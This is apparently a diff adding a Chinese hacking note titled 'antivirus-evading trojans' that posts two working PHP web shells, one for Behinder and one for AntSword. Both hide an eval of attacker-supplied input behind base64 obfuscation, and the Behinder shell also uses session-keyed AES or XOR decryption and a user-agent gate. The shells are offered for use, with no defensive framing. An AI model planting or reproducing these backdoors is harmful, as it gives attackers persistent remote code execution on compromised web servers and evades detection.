@@ -1,0 +1,92 @@
+免杀马子。。。
+贴两个能用的
+冰蝎
+
+‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘
+	<?php 
+	
+	@error_reporting(0);
+	session_start();
+	class dd{
+	    function __construct(){
+	        $tmmp='cHBocDovL2lucHV0';
+	        $a=base64_decode($tmmp);
+	        $ss=substr($a,1);
+	        $GLOBALS['adad'] = $ss;
+	    }
+	}
+	
+	new dd();
+	if (isset($_GET['pass']))
+	{
+	    $key=substr(md5(uniqid(rand())),16);
+	    $_SESSION['k']=$key;
+	    print $key;
+	}
+	else
+	{
+	    $key=$_SESSION['k'];
+	    $post=file_get_contents($adad);
+	    if(!extension_loaded('openssl'))
+	    {
+	        $t="bbase64_"."decode";
+	        $t=substr($t, 1);
+	        $post=$t($post."");
+	        
+	        for($i=0;$i<strlen($post);$i++) {
+	                 $post[$i] = $post[$i]^$key[$i+1&15]; 
+	                }
+	    }
+	    else
+	    {
+	        $post=openssl_decrypt($post, "AES128", $key);
+	    }
+	    //设置ua检测防止爆菊
+	    if ($_SERVER['HTTP_USER_AGENT'] == 'ranchen') {
+	        $arr=explode('|',$post);
+	        $func=$arr[0];
+	        $params=$arr[1];
+	        class ranchen
+	{ 
+	        public $code = null;
+	        public $decode = null;
+	        function __construct($p)
+	        {       $this->code=base64_encode($p);
+	                $this->decode = @base64_decode( $this->code );
+	                @Eval($this->decode);
+	        }
+	
+	}
+	new ranchen($params);
+	    }
+	   
+	}
+	
+	
+	?>
+
+‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘	
+	
+蚁剑
+
+
+‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘
+<?php 
+class c
+{
+        public $code = null;
+        public $decode = null;
+        function __construct()
+        {       $this->code='ZXZhbCgkX1BPU1RbcGFzc10pOw==';
+                $this->decode = @base64_decode( $this->code );
+                @Eval($this->decode);
+        }
+
+}
+new c();
+
+‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘
+
+?>
+
+参考链接 ：https://www.t00ls.net/viewthread.php?tid=57049&highlight=%E5%85%8D%E6%9D%80
